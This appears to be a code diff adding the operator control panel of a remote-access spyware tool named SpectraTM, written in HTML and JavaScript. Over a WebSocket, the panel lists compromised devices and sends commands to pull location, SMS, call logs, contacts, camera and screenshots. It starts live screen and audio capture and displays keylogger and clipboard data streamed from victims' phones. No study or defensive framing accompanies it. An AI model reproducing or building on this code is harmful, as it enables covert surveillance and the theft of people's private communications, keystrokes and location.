@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpectraTM Control Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: linear-gradient(90deg, #001100, #002200);
+            padding: 1rem;
+            border-bottom: 2px solid #00ff00;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        .status {
+            display: flex;
+            gap: 1rem;
+            font-size: 0.9rem;
+        }
+
+        .status-item {
+            padding: 0.3rem 0.8rem;
+            border: 1px solid #00ff00;
+            border-radius: 3px;
+            background: rgba(0, 255, 0, 0.1);
+        }
+
+        .container {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            height: calc(100vh - 80px);
+        }
+
+        .sidebar {
+            background: #111;
+            border-right: 2px solid #00ff00;
+            padding: 1rem;
+            overflow-y: auto;
+        }
+
+        .device-list {
+            margin-bottom: 2rem;
+        }
+
+        .device-item {
+            padding: 0.8rem;
+            margin: 0.5rem 0;
+            border: 1px solid #003300;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: rgba(0, 50, 0, 0.2);
+        }
+
+        .device-item:hover,
+        .device-item.active {
+            border-color: #00ff00;
+            background: rgba(0, 255, 0, 0.1);
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+
+        .device-id {
+            font-weight: bold;
+            margin-bottom: 0.3rem;
+        }
+
+        .device-info {
+            font-size: 0.8rem;
+            color: #888;
+        }
+
+        .main-content {
+            padding: 1rem;
+            overflow-y: auto;
+        }
+
+        .connection-form {
+            background: rgba(0, 50, 0, 0.2);
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.3rem;
+            font-weight: bold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 0.5rem;
+            background: #222;
+            border: 1px solid #555;
+            color: #00ff00;
+            border-radius: 3px;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #00ff00;
+            box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
+        }
+
+        .btn {
+            padding: 0.5rem 1rem;
+            background: transparent;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            cursor: pointer;
+            border-radius: 3px;
+            margin: 0.3rem;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            background: rgba(0, 255, 0, 0.1);
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+
+        .media-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+
+        .video-panel,
+        .audio-panel {
+            background: rgba(0, 50, 0, 0.2);
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 1rem;
+        }
+
+        .video-panel h3,
+        .audio-panel h3 {
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        #screenVideo {
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #00ff00;
+            border-radius: 3px;
+            background: #000;
+        }
+
+        #audioPlayer {
+            width: 100%;
+            margin-top: 1rem;
+        }
+
+        .data-panel {
+            background: rgba(0, 50, 0, 0.2);
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+
+        .data-panel h3 {
+            margin-bottom: 1rem;
+            border-bottom: 1px solid #00ff00;
+            padding-bottom: 0.5rem;
+        }
+
+        #dataLog {
+            height: 300px;
+            overflow-y: auto;
+            background: #000;
+            border: 1px solid #333;
+            padding: 0.5rem;
+            font-size: 0.8rem;
+            white-space: pre-wrap;
+        }
+
+        .command-panel {
+            background: rgba(0, 50, 0, 0.2);
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+
+        .command-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 0.5rem;
+            margin-top: 1rem;
+        }
+
+        .offline {
+            color: #ff0000;
+        }
+
+        .online {
+            color: #00ff00;
+        }
+
+        .scrollbar::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .scrollbar::-webkit-scrollbar-track {
+            background: #222;
+        }
+
+        .scrollbar::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            border-radius: 4px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+            
+            .sidebar {
+                display: none;
+            }
+            
+            .media-container {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">🔍 SPECTRATM</div>
+        <div class="status">
+            <div class="status-item">Status: <span id="connectionStatus" class="offline">Disconnected</span></div>
+            <div class="status-item">Devices: <span id="deviceCount">0</span></div>
+            <div class="status-item">Data: <span id="dataCount">0</span></div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="sidebar scrollbar">
+            <div class="connection-form">
+                <h3>Connection</h3>
+                <div class="form-group">
+                    <label for="deviceToken">Device Token:</label>
+                    <input type="text" id="deviceToken" placeholder="Enter device ID" />
+                </div>
+                <button class="btn" onclick="connectToDevice()">Connect</button>
+                <button class="btn" onclick="refreshDevices()">Refresh</button>
+            </div>
+
+            <div class="device-list">
+                <h3>Active Devices</h3>
+                <div id="deviceList">
+                    <div style="text-align: center; color: #666; padding: 2rem;">
+                        No devices connected
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="main-content scrollbar">
+            <div class="media-container">
+                <div class="video-panel">
+                    <h3>📹 Screen Capture</h3>
+                    <video id="screenVideo" autoplay muted></video>
+                    <div style="text-align: center; margin-top: 0.5rem;">
+                        <button class="btn" onclick="toggleScreenCapture()">Start Capture</button>
+                    </div>
+                </div>
+
+                <div class="audio-panel">
+                    <h3>🎤 Audio Stream</h3>
+                    <audio id="audioPlayer" controls></audio>
+                    <div style="text-align: center; margin-top: 0.5rem;">
+                        <button class="btn" onclick="toggleAudioCapture()">Start Audio</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="command-panel">
+                <h3>📱 Remote Commands</h3>
+                <div class="command-buttons">
+                    <button class="btn" onclick="sendCommand('location')">Get Location</button>
+                    <button class="btn" onclick="sendCommand('sms')">Fetch SMS</button>
+                    <button class="btn" onclick="sendCommand('calls')">Call Log</button>
+                    <button class="btn" onclick="sendCommand('contacts')">Contacts</button>
+                    <button class="btn" onclick="sendCommand('screenshot')">Screenshot</button>
+                    <button class="btn" onclick="sendCommand('camera')">Camera</button>
+                </div>
+            </div>
+
+            <div class="data-panel">
+                <h3>📊 Live Data Stream</h3>
+                <div id="dataLog" class="scrollbar"></div>
+                <div style="text-align: center; margin-top: 0.5rem;">
+                    <button class="btn" onclick="clearLog()">Clear Log</button>
+                    <button class="btn" onclick="exportLog()">Export Data</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let ws;
+        let currentDevice = null;
+        let dataCount = 0;
+        let isConnected = false;
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeWebSocket();
+            refreshDevices();
+            setInterval(updateStatus, 5000);
+        });
+
+        function initializeWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}/live`;
+            
+            ws = new WebSocket(wsUrl);
+            ws.binaryType = 'arraybuffer';
+
+            ws.onopen = () => {
+                isConnected = true;
+                updateConnectionStatus('Connected', true);
+                log('✅ Connected to SpectraTM server');
+            };
+
+            ws.onmessage = (event) => {
+                handleWebSocketMessage(event);
+            };
+
+            ws.onclose = () => {
+                isConnected = false;
+                updateConnectionStatus('Disconnected', false);
+                log('❌ Disconnected from server');
+                
+                // Reconnect after 3 seconds
+                setTimeout(initializeWebSocket, 3000);
+            };
+
+            ws.onerror = (error) => {
+                log('❌ WebSocket error: ' + error);
+            };
+        }
+
+        function handleWebSocketMessage(event) {
+            if (event.data instanceof ArrayBuffer) {
+                handleBinaryData(event.data);
+            } else {
+                try {
+                    const data = JSON.parse(event.data);
+                    handleJsonData(data);
+                } catch (e) {
+                    log('❌ Error parsing message: ' + e.message);
+                }
+            }
+        }
+
+        function handleBinaryData(arrayBuffer) {
+            // Handle audio stream
+            const blob = new Blob([arrayBuffer], { type: 'audio/wav' });
+            const audioUrl = URL.createObjectURL(blob);
+            
+            const audioPlayer = document.getElementById('audioPlayer');
+            audioPlayer.src = audioUrl;
+            audioPlayer.load();
+            
+            log('🎵 Audio stream received (' + arrayBuffer.byteLength + ' bytes)');
+        }
+
+        function handleJsonData(data) {
+            dataCount++;
+            updateDataCount();
+
+            log(`📥 ${data.type}: ${JSON.stringify(data, null, 2)}`);
+
+            switch (data.type) {
+                case 'location':
+                    handleLocationData(data);
+                    break;
+                case 'sms':
+                    handleSmsData(data);
+                    break;
+                case 'calls':
+                    handleCallsData(data);
+                    break;
+                case 'contacts':
+                    handleContactsData(data);
+                    break;
+                case 'keylog':
+                    handleKeylogData(data);
+                    break;
+                case 'clipboard':
+                    handleClipboardData(data);
+                    break;
+                case 'cam':
+                    handleCameraData(data);
+                    break;
+                case 'screen':
+                    handleScreenData(data);
+                    break;
+                default:
+                    log(`📦 Unknown data type: ${data.type}`);
+            }
+        }
+
+        function handleLocationData(data) {
+            log(`📍 Location: ${data.latitude}, ${data.longitude} (±${data.accuracy}m)`);
+        }
+
+        function handleSmsData(data) {
+            log(`💬 SMS data: ${data.data.length} messages`);
+        }
+
+        function handleCallsData(data) {
+            log(`📞 Call log: ${data.data.length} entries`);
+        }
+
+        function handleContactsData(data) {
+            log(`👥 Contacts: ${data.data.length} entries`);
+        }
+
+        function handleKeylogData(data) {
+            log(`⌨️ Keylog [${data.package}]: ${data.text}`);
+        }
+
+        function handleClipboardData(data) {
+            log(`📋 Clipboard: ${data.text}`);
+        }
+
+        function handleCameraData(data) {
+            log(`📷 Camera image received`);
+            // Could display image here if needed
+        }
+
+        function handleScreenData(data) {
+            const screenVideo = document.getElementById('screenVideo');
+            screenVideo.src = `data:image/jpeg;base64,${data.payload}`;
+        }
+
+        function connectToDevice() {
+            const token = document.getElementById('deviceToken').value.trim();
+            if (!token) {
+                alert('Please enter a device token');
+                return;
+            }
+
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ auth: token }));
+                currentDevice = token;
+                log(`🔗 Connecting to device: ${token}`);
+            }
+        }
+
+        function sendCommand(command) {
+            if (!currentDevice) {
+                alert('No device connected');
+                return;
+            }
+
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    command: command,
+                    targetDevice: currentDevice,
+                    params: {},
+                    timestamp: new Date().toISOString()
+                }));
+                log(`📤 Command sent: ${command}`);
+            }
+        }
+
+        function toggleScreenCapture() {
+            sendCommand('start_screen_capture');
+        }
+
+        function toggleAudioCapture() {
+            sendCommand('start_audio_capture');
+        }
+
+        async function refreshDevices() {
+            try {
+                const response = await fetch('/api/devices');
+                const data = await response.json();
+                updateDeviceList(data.devices);
+                updateDeviceCount(data.totalDevices);
+            } catch (e) {
+                log('❌ Error fetching devices: ' + e.message);
+            }
+        }
+
+        function updateDeviceList(devices) {
+            const deviceList = document.getElementById('deviceList');
+            
+            if (devices.length === 0) {
+                deviceList.innerHTML = '<div style="text-align: center; color: #666; padding: 2rem;">No devices connected</div>';
+                return;
+            }
+
+            deviceList.innerHTML = devices.map(device => `
+                <div class="device-item" onclick="selectDevice('${device.id}')">
+                    <div class="device-id">${device.id}</div>
+                    <div class="device-info">
+                        Status: <span class="${device.isOnline ? 'online' : 'offline'}">
+                            ${device.isOnline ? 'Online' : 'Offline'}
+                        </span><br>
+                        Last seen: ${new Date(device.lastSeen).toLocaleString()}<br>
+                        Messages: ${device.totalMessages}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function selectDevice(deviceId) {
+            currentDevice = deviceId;
+            document.getElementById('deviceToken').value = deviceId;
+            
+            // Update UI to show selected device
+            document.querySelectorAll('.device-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            
+            event.target.closest('.device-item').classList.add('active');
+            
+            log(`📱 Selected device: ${deviceId}`);
+        }
+
+        function log(message) {
+            const logElement = document.getElementById('dataLog');
+            const timestamp = new Date().toLocaleTimeString();
+            logElement.textContent += `[${timestamp}] ${message}\n`;
+            logElement.scrollTop = logElement.scrollHeight;
+        }
+
+        function clearLog() {
+            document.getElementById('dataLog').textContent = '';
+            dataCount = 0;
+            updateDataCount();
+        }
+
+        function exportLog() {
+            const logContent = document.getElementById('dataLog').textContent;
+            const blob = new Blob([logContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `spectratm-log-${new Date().toISOString().slice(0, 19)}.txt`;
+            a.click();
+            
+            URL.revokeObjectURL(url);
+        }
+
+        function updateConnectionStatus(status, isOnline) {
+            const statusElement = document.getElementById('connectionStatus');
+            statusElement.textContent = status;
+            statusElement.className = isOnline ? 'online' : 'offline';
+        }
+
+        function updateDeviceCount(count) {
+            document.getElementById('deviceCount').textContent = count || 0;
+        }
+
+        function updateDataCount() {
+            document.getElementById('dataCount').textContent = dataCount;
+        }
+
+        async function updateStatus() {
+            if (!isConnected) return;
+            
+            try {
+                const response = await fetch('/api/stats');
+                const stats = await response.json();
+                // Update additional stats if needed
+            } catch (e) {
+                // Ignore errors during status updates
+            }
+        }
+    </script>
+</body>
+</html>
